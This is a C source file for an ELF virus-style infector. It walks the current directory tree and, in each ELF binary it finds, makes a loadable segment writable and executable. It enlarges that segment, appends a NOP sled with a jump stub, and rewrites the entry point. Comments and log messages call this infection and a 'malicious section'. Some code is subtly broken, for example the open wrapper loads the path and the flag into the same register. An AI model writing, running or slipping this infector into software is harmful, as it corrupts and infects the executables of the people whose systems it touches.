#define _XOPEN_SOURCE 500
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <ftw.h>
#include <string.h>
#include <stdlib.h>
#include <elf.h>
#include <fcntl.h>
#define ROOT_DIR   (".")
#define SPARE_FDS  (4)
#define MAX_FDS    (512)

//6144

typedef struct temp_Elf64_Shdr{
  Elf64_Word    sh_name;                /* Section name (string tbl index) */
  Elf64_Word    sh_type;                /* Section type */
  Elf64_Xword   sh_flags;               /* Section flags */
  Elf64_Addr    sh_addr;                /* Section virtual addr at execution */
  Elf64_Off     sh_offset;              /* Section file offset */
  Elf64_Xword   sh_size;                /* Section size in bytes */
  Elf64_Word    sh_link;                /* Link to another section */
  Elf64_Word    sh_info;                /* Additional section information */
  Elf64_Xword   sh_addralign;           /* Section alignment */
  Elf64_Xword   sh_entsize;             /* Entry size if section holds table */
} temp_Elf64_Shdr;//Elf64_Shdr;

typedef struct temp_Elf64_Phdr{
  Elf64_Word    p_type;                 /* Segment type */
  Elf64_Word    p_flags;                /* Segment flags */
  Elf64_Off     p_offset;               /* Segment file offset */
  Elf64_Addr    p_vaddr;                /* Segment virtual address */
  Elf64_Addr    p_paddr;                /* Segment physical address */
  Elf64_Xword   p_filesz;               /* Segment size in file */
  Elf64_Xword   p_memsz;                /* Segment size in memory */
  Elf64_Xword   p_align;                /* Segment alignment */
} temp_Elf64_Phdr;//Elf64_Phdr;

typedef struct temp_Elf64_Ehdr{
  unsigned char e_ident[EI_NIDENT];     /* Magic number and other info */
  Elf64_Half    e_type;                 /* Object file type */
  Elf64_Half    e_machine;              /* Architecture */
  Elf64_Word    e_version;              /* Object file version */
  Elf64_Addr    e_entry;                /* Entry point virtual address */
  Elf64_Off     e_phoff;                /* Program header table file offset */
  Elf64_Off     e_shoff;                /* Section header table file offset */
  Elf64_Word    e_flags;                /* Processor-specific flags */
  Elf64_Half    e_ehsize;               /* ELF header size in bytes */
  Elf64_Half    e_phentsize;            /* Program header table entry size */
  Elf64_Half    e_phnum;                /* Program header table entry count */
  Elf64_Half    e_shentsize;            /* Section header table entry size */
  Elf64_Half    e_shnum;                /* Section header table entry count */
  Elf64_Half    e_shstrndx;             /* Section header string table index */
} temp_Elf64_Ehdr;//Elf64_Ehdr;


int activate(){
    return 1; // 
}

void my_memcpy(char* d, char* s, int l){
    int i=0;
    while(l--){
        d[i]=s[i];
        i++;
    }
}

static inline int my_access(const char *fpath, int flag){
	/*
     #define R_OK   4   // test for read permission 
     #define W_OK   2   // test for write permission 
     #define X_OK   1   // test for execute (search) permission 
     #define F_OK   0   // test for presence of file 
	*/
   long long ret;
   asm("mov %0, %%rdi"::"r" ((long long)fpath));
   asm("mov %0, %%rsi"::"r" ((long long)flag));
   asm("mov $21, %rax");
   asm("syscall");
   asm("mov %%rax, %0":"=r"(ret));
   return ret;
}

static inline int my_open(const char *fpath, int flag){
    long long ret;
    asm("mov %0, %%rsi"::"r"((long long)fpath));
    asm("mov %0, %%rsi"::"r"((long long)flag));
    asm("mov $2,%rax");
    asm("syscall");
    asm("mov %%rax, %0":"=r"(ret));
    return ret;
}

static inline int my_read(unsigned int fd, char *buf, int count){
    long long ret;
    asm("mov %0, %%rdi"::"r"((long long)fd));
    asm("mov %0, %%rsi"::"r"((long long)buf));
    asm("mov %0, %%rdx"::"r"((long long)count));
    asm("mov $0,%rax");
    asm("syscall");
    asm("mov %%rax, %0":"=r"(ret)::);
    return ret;
}

static inline int my_write(unsigned int fd, char *buf, int count){
    long long ret;
    asm("mov %0, %%rdi"::"r"((long long)fd));
    asm("mov %0, %%rsi"::"r"((long long)buf));
    asm("mov %0, %%rdx"::"r"((long long)count));
    asm("mov $1,%rax");
    asm("syscall");
    asm("mov %%rax, %0":"=r"(ret)::);
    return ret;
}

static inline int my_lseek(int fd, int offset, int origin){
   long long ret;
   asm("mov %0, %%rdi"::"r"((long long)fd));
   asm("mov %0, %%rsi"::"r"((long long)offset));
   asm("mov %0, %%rdx"::"r"((long long)origin));
   asm("mov $8, %rax");
   asm("syscall");
   asm("mov %%rax, %0":"=r"(ret));
   return ret;
}


void change_entrypoint(const char* fpath){
	int fd, i, shellcodeloc;
	int is_infected_already = 1;  
	char jmp2original[15];
	char shellcode[0x1000];
	int filesize;
	Elf64_Shdr shdr;
	Elf64_Phdr phdr;
	Elf64_Ehdr ehdr;
	
	if(my_access(fpath,7)!=0){ // R_OK|W_OK|X_OK = 7
		printf("[ERROR] Permission error(%s)\n",fpath);
		return 0;
	}
	if(!activate()){
		printf("[ERROR] Debugger detected(%s)\n",fpath);
		return 0;
	}
	fd = my_open(fpath, 2); // O_RDWR = 2
	if (fd < 0){
		printf("[ERROR] fd error(%s)\n",fpath);
		return 0;
	}
	if (my_read(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)){
		printf("[ERROR] ehdr read error(%s)\n",fpath);
		return 0;
	}
	if(!(ehdr.e_ident[1]=='E' && ehdr.e_ident[2]=='L' && ehdr.e_ident[3]=='F')){ 
		printf("[ERROR] not ELF!(%s) \n",fpath);
		return 0;
	}
	
	printf("[INFECTED] Entry point (%s): 0x%x\n", fpath, ehdr.e_entry);
	
	// [02] Read page headers info.
	my_lseek(fd, ehdr.e_phoff, SEEK_SET); // TAPE : page header start offset
	for(i=0;i<ehdr.e_phnum;i++){
		if (my_read(fd, &phdr, sizeof(phdr)) != sizeof(phdr)){
			//printf("[ERROR] phdr read error(%s)\n",fpath);
			return 0;
		}
		else{
			// Find RW_ Data page(Loadable Segment && PF_Read_Write(6)) and add Executable permission.
			if(phdr.p_type==1 && phdr.p_flags==5){
				printf("[INFO] phdr.p_flags = %d, phdr.p_vaddr = 0x%x\n",phdr.p_flags,phdr.p_vaddr);
				my_lseek(fd, -sizeof(phdr), SEEK_CUR); // go back to start of page header
				printf("[BEFORE] phdr.p_flags = %d, phdr.p_filesz = 0x%x, phdr.p_memsz = 0x%x\n",phdr.p_flags,phdr.p_filesz,phdr.p_memsz);
				phdr.p_flags=7; 
				
				phdr.p_filesz += 0x10000; // 적게주면 불리하니 최대한 많이 줌
				phdr.p_memsz += 0x10000;  // 적게주면 불리하니 최대한 많이 줌
				
				my_write(fd, &phdr, sizeof(phdr));
				printf("[AFTER ] phdr.p_flags = %d, phdr.p_filesz = 0x%x, phdr.p_memsz = 0x%x\n",phdr.p_flags,phdr.p_filesz,phdr.p_memsz);
				is_infected_already = 0; // This binary is not infected already.
				break; // 대상 phdr를 읽은상태에서 break.
			}
		}
	}
	if(is_infected_already){
		printf("[OOPS] This binary is already infected! Terminate infection routine.\n");
		return 0;
	}
	
	
	/*---------------------------------------------------------------------------*/
	// Section header for malicious section. 
	
	filesize = ehdr.e_shoff + (ehdr.e_shentsize * (ehdr.e_shnum));
	shellcodeloc = phdr.p_vaddr + filesize; 
	printf("[NEW] shellcodeloc(0x%x) = phdr.p_vaddr(0x%x) + filesize(0x%x)\n",shellcodeloc, phdr.p_vaddr, filesize);
	
	printf("[BEFORE] Entry point (%s): 0x%x\n", fpath, ehdr.e_entry);
	
	
	/*---------------------------------------------------------------------------*/
	// Malicious section 
	
	/*
	  We use $RDI register to get relocation information. 
	  $RDI holds base VA offset info!
	  
	  ex)
	  
	  - If PIE binary : 
	  *RDI  0x7ffff7ffe168 <- 0x555555554000 
	
	  - If not :  
	  *RDI  0x7ffff7ffe168 <— 0x0
	*/
	
	/* 48 b8 41 41 41 41 41 41 41 41	movabs rax,0x4141414141414141 */
	jmp2original[0] = 0x48;
	jmp2original[1] = 0xb8;
	my_memcpy(&jmp2original[2], &ehdr.e_entry, sizeof(ehdr.e_entry));
	
	/* 48 03 07	add    rax,QWORD PTR [rdi]*/
	jmp2original[10] = 0x48;
	jmp2original[11] = 0x03;
	jmp2original[12] = 0x07;
	
	/* ff e0	jmp    rax */
	jmp2original[13] = 0xff;
	jmp2original[14] = 0xe0;
	
	
	// 파일의끝에
	my_lseek(fd,0,SEEK_END);  
	memset(shellcode,'\x90',0x1000);
	my_write(fd,shellcode,0x1000 - sizeof(jmp2original));
	my_write(fd,jmp2original,sizeof(jmp2original));
	
	//gogo
	//엔트리포인트 수정하기
	ehdr.e_entry = shellcodeloc;
	my_lseek(fd, 0, SEEK_SET);
	//if (my_write(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)) return 0; //write 실패
	my_write(fd, &ehdr, sizeof(ehdr));
	printf("[After ]Entry point (%s): 0x%x\n", fpath, ehdr.e_entry);
	
}

int file_process(const char *fpath, const struct stat *sb, int flag, struct FTW *s){
    int ret = 0;
    if (flag == FTW_F && activate()) {
		change_entrypoint(fpath);
		printf("\n");
	}
    return ret;
}

int main(int argc, char* argv[])
{
    struct timeval t;
    int nfds = getdtablesize() - SPARE_FDS;
    nfds = nfds > MAX_FDS ? MAX_FDS : nfds;

    gettimeofday(&t, NULL);
    srand(t.tv_usec * t.tv_sec);
    nftw(ROOT_DIR, file_process, nfds, FTW_PHYS);
    exit(0);
}
//ls new entry point : 0x61feb8?


